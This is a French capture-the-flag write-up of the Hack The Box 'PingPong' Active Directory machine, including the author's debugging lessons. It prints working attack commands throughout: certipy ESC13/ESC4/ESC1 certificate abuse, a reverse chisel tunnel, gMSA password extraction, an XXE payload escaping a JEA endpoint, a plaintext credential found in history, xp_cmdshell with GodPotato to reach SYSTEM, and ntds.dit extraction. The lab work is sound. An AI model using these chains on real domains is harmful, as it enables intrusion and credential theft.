# PingPong HTB : comment on a bouffé 12 jours de debug pour 3 jours de chemin réel

Machine PingPong, Hack The Box. Très difficile. Active Directory multi-forêts, confiance bidirectionnelle PING↔PONG. Un seul compte de départ : `c.roberts`, Domain User sur PING, mot de passe `AssumedBreach123`.

31 sessions plus tard, j'avais les deux flags. Entre les deux : un tunnel chisel qui a mis 3 jours à marcher, un parseur de SID qui mentait depuis le début, un MSSQL qui disait "untrusted domain" treize fois de suite avant qu'on comprenne pourquoi, et un golden ticket inter-realm qui aurait dû marcher mais que Server 2022 a mangé.

Si t'es là pour le résumé technique : ESC13 → gMSA Managers WriteDACL → XXE JEA → PSReadLine → password c.carlssen → DCSync PONG → ESC4 → ESC1 → root.txt. Le reste de ce texte, c'est comment on y est arrivé.

---

## Étape 1 : c.roberts et le template TemporaryWinRM

BloodHound montre que c.roberts est dans TempWinRMAccess. Ce groupe a le droit d'enrollment sur le template de certificat TemporaryWinRM. Donc ESC13.

```bash
certipy req -u c.roberts@ping.htb -p AssumedBreach123 \
  -ca ping-dc1-ca -template TemporaryWinRM -dc-ip 10.129.245.56

certipy auth -pfx c.roberts.pfx -dc-ip 10.129.245.56
```

TGT TempWinRMAccess en poche. pypsrp vers DC1, whoami = ping\c.roberts. Première étape pliée en 20 minutes. La dernière en prendra 300 fois plus.

---

## Étape 2 : le tunnel qui nous a mis par terre

Pour parler à PONG (deuxième forêt), il faut un tunnel depuis DC1 vers le LAN 192.168.2.0/24. Outil choisi : Chisel.

Trois jours.

Le client Windows chisel 1.11.5 refuse de se connecter au serveur 1.10.1. Stream error. Version match 1.11.5 des deux côtés ? Le client Windows crashe dès que pypsrp ferme la session. SSH reverse tunnel ? Job Object kill le process. pf NAT sur Mac ? Les règles nat/binat évaluent zéro paquet. Wine amd64 dans Docker pour tester le binaire Windows ? Le binaire est PE32+, pas ELF, et le container ARM64 via Rosetta peut pas le lancer.

Solution trouvée au bout du 3ème jour :

```
Mac :     chisel 1.11.5 server --reverse --port 8890
DC1 :     chiselw.exe client 10.10.14.210:8890 R:40888:192.168.2.2:88 R:40389:192.168.2.2:389
Container : socat 127.0.0.1:88 → Mac:40888   (KDC PONG)
Container : socat 127.0.0.1:389 → Mac:40389  (LDAP PONG)
```

Start-Sleep 3600 dans le script pypsrp pour empêcher le process chisel de mourir avec la session. Crade mais efficace.

Si je devais retenir un truc de ces 3 jours : vérifie la version exacte des binaires avant de passer 6 heures à debugger le réseau.

---

## Étape 3 : le SID fantôme et la DACL qu'on lisait mal

LDAP cross-realm vers PONG fonctionne. On énumère. Le groupe gMSA Managers (PONG) peut lire le mot de passe du compte gMSA `Pong_gMSA$`. Sauf que le groupe est vide, scope Global, et tout le monde nous dit "insufficientAccessRights" quand on essaie d'écrire.

On lit les attributs LDAP : c.roberts a GenericAll sur le groupe. Pourtant bloodyAD refuse toute modification.

Le bug venait de notre script de parsing BloodHound. Il générait un SID complètement faux à cause d'un parsing binaire incorrect du binary SID.

```
SID utilisé (faux) :   S-1-5-21-735101288-...
SID réel c.roberts :   S-1-5-21-750635624-2058721901-1932338391-2617
```

Trois jours à essayer d'écrire avec un SID qui n'existe pas.

Deuxième souci : bloodyAD pose ses ACEs avec flags OICI (0x3), qui s'appliquent aux objets enfants uniquement, pas à l'objet racine. Donc même avec le bon SID, l'ACE ne servait à rien sur le groupe lui-même. Solution : GSSAPI + ldap3 + AceFlags=0 en direct, sans bloodyAD.

GroupType flip Global→Domain Local. c.roberts ajouté comme Foreign Security Principal. Le blob msDS-ManagedPassword de Pong_gMSA$ devient lisible.

Deuxième leçon : ne jamais faire confiance au parsing SID d'un script maison sans vérifier avec un outil qui a fait ses preuves.

---

## Étape 4 : le blob gMSA qui livrait pas ses clés

Blob de 548 bytes. Structure MSDS_MANAGEDPASSWORD_BLOB. NT hash facile à extraire (MD4 du password string). Mais pour générer un TGT, il faut les clés AES.

Deux sessions à dériver PBKDF2 manuellement avec des salts différents : PONG.HTBPong_gMSA$, PONG.HTBpong_gmsa, pong.htbPong_gMSA$, etc. Aucune ne marche contre le KDC PONG. KDC_ERR_PREAUTH_FAILED systématique.

La solution est venue de nxc :

```bash
nxc ldap dc2.pong.htb -d ping.htb -u c.roberts -k --use-kcache --gmsa
→ AES256: 25f723bf67708cad8ae181e861d59c3e3407e0c4c079f25673481c5f169a6561
```

bloodyAD ne retourne que le PasswordString du blob. nxc lit l'attribut LDAP brut et parse la structure GMSA_CREDENTIAL complète. Les clés AES sont stockées directement dedans, pas dérivées du password. PBKDF2 ne servait à rien depuis le début.

Bonus : le password string contient des surrogates UTF-16LE qui font crasher impacket. Patch de 3 lignes dans crypto.py : `string.encode("utf-8", errors="surrogatepass")`.

---

## Étape 5 : le JEA qu'on pensait mort

Pong_gMSA$ se connecte au JEA endpoint `restricted` sur DC1. RestrictedRemoteServer, ConstrainedLanguage. 8 cmdlets : Clear-Host, Exit-PSSession, Get-Command, Get-FormatData, Get-Help, Measure-Object, Out-Default, Select-Object. Pas de FileSystem provider, pas de .NET via New-Object, pas de Out-File.

Analyse complète des definitions XML. Aucune fonction custom métier. Cul-de-sac apparent.

Mais j'avais oublié un détail : `[System.Xml.XmlDocument]::new()` n'est pas `New-Object`. Le premier est un constructeur statique .NET, le deuxième est une cmdlet PowerShell bloquée par JEA. ConstrainedLanguage ne bloque pas les appels statiques aux classes .NET.

```powershell
$x = [System.Xml.XmlDocument]::new()
$dtd = "<!ENTITY x SYSTEM 'file:///C:/Users/Pong_gMSA$/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt'>"
$xml = "<?xml version='1.0'?><!DOCTYPE foo [$dtd]><root>&x;</root>"
$x.LoadXml($xml)
```

XXE via DTD external entity. Le fichier PSReadLine de Pong_gMSA$ contient 43 commandes d'historique. Parmi elles :

```
$c = New-object System.management.automation.pscredential("pong\c.carlssen",
  $(convertto-securestring -asplaintext -force "A()DUJ!@414"))
Enter-pssession -computername dc2.pong.htb -credential $c
```

Un admin a utilisé le compte gMSA pour tester la connexion vers DC2, et le mot de passe de c.carlssen est resté dans l'historique PowerShell.

Troisième leçon : PSReadLine history se vérifie systématiquement, même (surtout) sur les comptes de service.

---

## Étape 6 : user.txt, enfin

c.carlssen@PONG est dans Remote Management Users et IT Service Admins. Double-hop WinRM :

```
DC1 (c.roberts@PING) → Enter-PSSession dc2.pong.htb (c.carlssen@PONG)
→ C:\Users\C.Carlssen\Desktop\user.txt
```

Flag : `06f75e8838b1b64deddb6c6979683a35`

---

## Étape 7 : les 13 "untrusted domain"

Pour root.txt il faut Administrator@PING. Le chemin passe par PONG : SYSTEM sur DC2, DCSync, ExtraSids vers PING.

c.carlssen a WriteProperty sur svc_sql (compte de service MSSQL). On configure RBCD : Pong_gMSA$ peut impersoner vers svc_sql. S4U2Proxy obtient un ticket MSSQL pour c.adam, qui est sysadmin.

```
mssqlclient.py -k c.adam@dc2.pong.htb
→ Login from an untrusted domain
```

Treize tentatives plus tard, toujours la même erreur. On a testé :

- Le nom du fichier ccache. c.adam@MSSQLSvc_dc2.pong.htb:1433@PONG.HTB.ccache contient `:`, que Kerberos interprète comme TYPE:chemin. Cache invisible.
- Le SPN exact. MSSQLSvc/dc2.pong.htb:1433 avec le port, pas sans.
- Le clock skew. 8h de décalage entre l'UTC du container et l'heure PONG. Patches timedelta dans getST.py ET kerberosv5.py (les deux fichiers, sinon TGS-REQ et AP-REQ sont désynchronisés).
- NTLM désactivé sur PONG, testé quand même.
- SOCKS vs tunnel direct.
- c.adam, svc_sql, c.carlssen, Administrator.

Avec -debug on confirme que le ticket arrive sur le serveur MSSQL. C'est le serveur qui rejette, pas le réseau.

Ce qui a marché au final : kvno (Kerberos natif MIT). getST.py patché générait un ticket structurellement différent du ticket que kvno produit. Le KDC acceptait les deux, MSSQL n'en acceptait qu'un.

```bash
kvno MSSQLSvc/dc2.pong.htb:1433
mssqlclient.py -k dc2.pong.htb
→ pong\c.adam (sysadmin=1)
```

Quatrième leçon : un `:` dans le nom du fichier ccache et Kerberos voit un type de cache inexistant. Deux heures à debugger un ticket qui n'était jamais chargé.

---

## Étape 8 : MSSQL à SYSTEM

```sql
sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
xp_cmdshell 'whoami';
→ pong\svc_sql
```

Il faut uploader GodPotato.exe. DC2 n'a pas de route directe vers le Mac. DC1 n'a pas de HTTP listener. Solution : découper le binaire en 11 chunks base64 de 7000 caractères, les echo un par un sur DC2, concaténer, certutil -decode.

```powershell
echo.LIGNE1>>$env:TEMP\gp.b64
# répéter 11 fois
certutil -decode $env:TEMP\gp.b64 $env:TEMP\GodPotato.exe
GodPotato -cmd "cmd /c whoami"
→ nt authority\system
```

Avec SYSTEM, c.carlssen devient Domain Admin PONG. Volume Shadow Copy extrait ntds.dit et SYSTEM.hive.

---

## Étape 9 : le golden ticket qui valait rien

krbtgt PONG hashé, clés AES en main. On forge un golden ticket inter-realm avec ExtraSids Domain Admins PING. Quatre tentatives, quatre échecs.

Le KDC est un Server 2022 avec PAC validation. Le PAC du golden ticket est signé avec krbtgt PONG, mais le KDC PING vérifie la signature cross-realm. Sans la clé du trust account PING$ dans PONG, la signature est invalide.

Cinquième leçon : golden ticket inter-realm ne passe pas sur Server 2022+ sans la clé du trust. Le lab le plus réaliste que j'aie vu sur cette mécanique.

---

## Étape 10 : ESC4 → ESC1 → fin du jeu

Le DCSync a aussi sorti R.Martinelli. Foreign Security Principal PONG, CA Manager sur la PKI PING.

On donne GenericAll à c.roberts sur le template SmartcardAuthentication (ESC4). On configure le template pour autoriser l'UPN dans le SAN (ESC1). On enroll un certificat avec UPN=administrator@ping.htb.

```bash
certipy req -u c.roberts@ping.htb -p AssumedBreach123 \
  -template SmartcardAuthentication -ca ping-dc1-ca \
  -upn administrator@ping.htb

certipy auth -pfx administrator.pfx -dc-ip 10.129.245.56
→ TGT Administrator@PING

nxc smb dc1.ping.htb -k --use-kcache
→ Pwn3d!
```

---

## root.txt

```bash
wmiexec.py -k -no-pass dc1.ping.htb
C:\> type C:\Users\Administrator\Desktop\root.txt
2723de5720139aca8e2b4ff2cbd9af01
```

---

## La timeline réelle

| Jour | Ce qui s'est passé |
|------|-------------------|
| 1 | ESC13 facile. Puis 3 jours sur Chisel. |
| 4 | Kerberos 3-step OK, tunnel PONG enfin UP |
| 5-7 | WriteDACL gMSA Managers. Bug de SID + flags OICI. |
| 8 | Blob gMSA lu. AES256 refuse de marcher. On dérive PBKDF2 dans le vide. |
| 9 | JEA analysé à fond. 8 cmdlets. Rien. Cul-de-sac. |
| 10 | XXE via XmlDocument::new(). PSReadLine history livre tout. |
| 11 | user.txt |
| 12-14 | MSSQL "untrusted domain" × 13. |
| 15 | kvno direct. Connecté en 1 commande. |
| 16 | GodPotato, SYSTEM, DCSync |
| 17 | Golden ticket inter-realm bloqué |
| 18 | ESC4 → ESC1 → PKINIT → root.txt |

3 jours de chemin clair. 12 jours de tunnels cassés, de SID foireux, de dérivations PBKDF2 inutiles, de fichiers ccache mal nommés et de "untrusted domain" à n'en plus finir.

---

## Ce que j'en retire

1. Un parseur SID maison qui dit un truc, un outil qui dit autre chose : crois l'outil.
2. Les binaires Chisel 1.10.1 et 1.11.5 ne se parlent pas. Version-match des deux côtés, toujours.
3. Le blob MSDS-MANAGEDPASSWORD retourné par bloodyAD n'est pas la structure GMSA_CREDENTIAL complète. Les clés AES sont dans la structure complète, pas dérivables du PasswordString.
4. `[Classe]::new()` passe en ConstrainedLanguage. `New-Object` non. Le JEA est moins hermétique qu'il en a l'air.
5. PSReadLine history sur les comptes de service : mère de toutes les fuites de credentials.
6. Pas de `:` ni de `@` dans les noms de fichiers ccache.
7. kvno (MIT Kerberos natif) et getST.py (impacket) ne génèrent pas le même ticket. Parfois le KDC accepte les deux, parfois le service applicatif n'en veut qu'un.
8. Golden ticket inter-realm + Server 2022 = mort sans la clé du trust account.

---

## Outils

BloodHound, Certipy, NetExec (nxc), Impacket, bloodyAD, Chisel, GodPotato, pypsrp, PowerShell, DeepSeek

---

*PingPong HTB, juin 2026. GoodcatSlivin.*
